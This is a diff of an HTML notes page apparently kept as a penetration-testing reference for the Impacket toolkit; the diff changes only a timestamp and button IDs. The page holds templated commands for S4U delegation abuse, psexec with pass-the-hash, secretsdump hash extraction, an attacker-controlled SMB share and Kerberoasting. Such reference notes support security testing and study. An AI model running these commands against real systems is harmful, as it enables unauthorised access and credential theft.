@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:16 -->
+<!-- 2026-07-30 Thu 22:27 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Impacket</title>
@@ -918,11 +918,11 @@ Related: [[Denote query for ‘20260721T210000’]]
 <h2 id="org1543d1e">Installation</h2>
 <div class="outline-text-2" id="text-org1543d1e">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_c29dce68fe2e4ef08593e8cf94aebe2c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_14b4b6f51e9c4f0ba8eb443191937f65>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_c29dce68fe2e4ef08593e8cf94aebe2c=document.querySelector('button[name=btn_c29dce68fe2e4ef08593e8cf94aebe2c]');
-copyBtnbtn_c29dce68fe2e4ef08593e8cf94aebe2c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`pipx install impacket\n# or\npip install impacket --break-system-packages\n`);copyBtnbtn_c29dce68fe2e4ef08593e8cf94aebe2c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c29dce68fe2e4ef08593e8cf94aebe2c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_14b4b6f51e9c4f0ba8eb443191937f65=document.querySelector('button[name=btn_14b4b6f51e9c4f0ba8eb443191937f65]');
+copyBtnbtn_14b4b6f51e9c4f0ba8eb443191937f65.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`pipx install impacket\n# or\npip install impacket --break-system-packages\n`);copyBtnbtn_14b4b6f51e9c4f0ba8eb443191937f65.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_14b4b6f51e9c4f0ba8eb443191937f65.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -947,11 +947,11 @@ a cloned repo.
 <h3 id="org85c921d">getST — constrained delegation / S4U ticket abuse</h3>
 <div class="outline-text-3" id="text-org85c921d">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_419a9a0282e249ccaaf9d14df8689c86>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_814d20be561b4c1fa744bc23915f195a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_419a9a0282e249ccaaf9d14df8689c86=document.querySelector('button[name=btn_419a9a0282e249ccaaf9d14df8689c86]');
-copyBtnbtn_419a9a0282e249ccaaf9d14df8689c86.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`impacket-getST -spn <service>/<host> -impersonate <target_user> \\\n  <domain>/<account>:'<password>' -dc-ip $DC\n`);copyBtnbtn_419a9a0282e249ccaaf9d14df8689c86.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_419a9a0282e249ccaaf9d14df8689c86.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_814d20be561b4c1fa744bc23915f195a=document.querySelector('button[name=btn_814d20be561b4c1fa744bc23915f195a]');
+copyBtnbtn_814d20be561b4c1fa744bc23915f195a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`impacket-getST -spn <service>/<host> -impersonate <target_user> \\\n  <domain>/<account>:'<password>' -dc-ip $DC\n`);copyBtnbtn_814d20be561b4c1fa744bc23915f195a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_814d20be561b4c1fa744bc23915f195a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -971,11 +971,11 @@ abuse chain.
 <h3 id="org70366c7">psexec — remote command execution / shell</h3>
 <div class="outline-text-3" id="text-org70366c7">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2326fd7b4a8c4987bd11c00a269c793c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_33cfde025d374ccdb0db333c65abf5c7>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_2326fd7b4a8c4987bd11c00a269c793c=document.querySelector('button[name=btn_2326fd7b4a8c4987bd11c00a269c793c]');
-copyBtnbtn_2326fd7b4a8c4987bd11c00a269c793c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# password auth\nimpacket-psexec <domain>/<user>:'<password>'@$IP\n\n# pass the hash\nimpacket-psexec -hashes :<ntlm_hash> <domain>/<user>@$IP\n\n# using a Kerberos ticket (from getST or similar)\nexport KRB5CCNAME=<ticket>.ccache\nimpacket-psexec -k -no-pass $IP\n`);copyBtnbtn_2326fd7b4a8c4987bd11c00a269c793c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2326fd7b4a8c4987bd11c00a269c793c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_33cfde025d374ccdb0db333c65abf5c7=document.querySelector('button[name=btn_33cfde025d374ccdb0db333c65abf5c7]');
+copyBtnbtn_33cfde025d374ccdb0db333c65abf5c7.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# password auth\nimpacket-psexec <domain>/<user>:'<password>'@$IP\n\n# pass the hash\nimpacket-psexec -hashes :<ntlm_hash> <domain>/<user>@$IP\n\n# using a Kerberos ticket (from getST or similar)\nexport KRB5CCNAME=<ticket>.ccache\nimpacket-psexec -k -no-pass $IP\n`);copyBtnbtn_33cfde025d374ccdb0db333c65abf5c7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_33cfde025d374ccdb0db333c65abf5c7.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -996,11 +996,11 @@ impacket-psexec -k -no-pass $<span style="color: var(--clr-variable); background
 <h3 id="orgae32b5c">secretsdump — credential/hash extraction</h3>
 <div class="outline-text-3" id="text-orgae32b5c">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3d8590a6c547464fb73ea45e5524fca7>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_fd0b96da1178403297de227c430ba1fa>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_3d8590a6c547464fb73ea45e5524fca7=document.querySelector('button[name=btn_3d8590a6c547464fb73ea45e5524fca7]');
-copyBtnbtn_3d8590a6c547464fb73ea45e5524fca7.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`impacket-secretsdump <domain>/<user>:'<password>'@$IP\nimpacket-secretsdump -just-dc <domain>/<user>:'<password>'@$DC\nimpacket-secretsdump -k -no-pass $DC   # via loaded Kerberos ticket\n`);copyBtnbtn_3d8590a6c547464fb73ea45e5524fca7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3d8590a6c547464fb73ea45e5524fca7.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_fd0b96da1178403297de227c430ba1fa=document.querySelector('button[name=btn_fd0b96da1178403297de227c430ba1fa]');
+copyBtnbtn_fd0b96da1178403297de227c430ba1fa.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`impacket-secretsdump <domain>/<user>:'<password>'@$IP\nimpacket-secretsdump -just-dc <domain>/<user>:'<password>'@$DC\nimpacket-secretsdump -k -no-pass $DC   # via loaded Kerberos ticket\n`);copyBtnbtn_fd0b96da1178403297de227c430ba1fa.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_fd0b96da1178403297de227c430ba1fa.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1015,11 +1015,11 @@ impacket-secretsdump -k -no-pass $<span style="color: var(--clr-variable); backg
 <h3 id="org84000a2">smbserver — quick attacker-controlled SMB share</h3>
 <div class="outline-text-3" id="text-org84000a2">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_246a3eec01be4e808bca57ccca881a5c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_47fe6135dc164d21ba1e32964000e10f>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_246a3eec01be4e808bca57ccca881a5c=document.querySelector('button[name=btn_246a3eec01be4e808bca57ccca881a5c]');
-copyBtnbtn_246a3eec01be4e808bca57ccca881a5c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`sudo impacket-smbserver -smb2support <sharename> $(pwd)\n`);copyBtnbtn_246a3eec01be4e808bca57ccca881a5c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_246a3eec01be4e808bca57ccca881a5c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_47fe6135dc164d21ba1e32964000e10f=document.querySelector('button[name=btn_47fe6135dc164d21ba1e32964000e10f]');
+copyBtnbtn_47fe6135dc164d21ba1e32964000e10f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`sudo impacket-smbserver -smb2support <sharename> $(pwd)\n`);copyBtnbtn_47fe6135dc164d21ba1e32964000e10f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_47fe6135dc164d21ba1e32964000e10f.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1038,11 +1038,11 @@ authentication (see
 <h3 id="org1ed7be0">GetUserSPNs — Kerberoasting</h3>
 <div class="outline-text-3" id="text-org1ed7be0">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_eb403c5418cf4361960e79f16a55fd3f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_26dd4f153a8c463196ab9d0727273e99>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_eb403c5418cf4361960e79f16a55fd3f=document.querySelector('button[name=btn_eb403c5418cf4361960e79f16a55fd3f]');
-copyBtnbtn_eb403c5418cf4361960e79f16a55fd3f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`impacket-GetUserSPNs <domain>/<user>:'<password>' -dc-ip $DC -request\n`);copyBtnbtn_eb403c5418cf4361960e79f16a55fd3f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_eb403c5418cf4361960e79f16a55fd3f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_26dd4f153a8c463196ab9d0727273e99=document.querySelector('button[name=btn_26dd4f153a8c463196ab9d0727273e99]');
+copyBtnbtn_26dd4f153a8c463196ab9d0727273e99.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`impacket-GetUserSPNs <domain>/<user>:'<password>' -dc-ip $DC -request\n`);copyBtnbtn_26dd4f153a8c463196ab9d0727273e99.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_26dd4f153a8c463196ab9d0727273e99.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
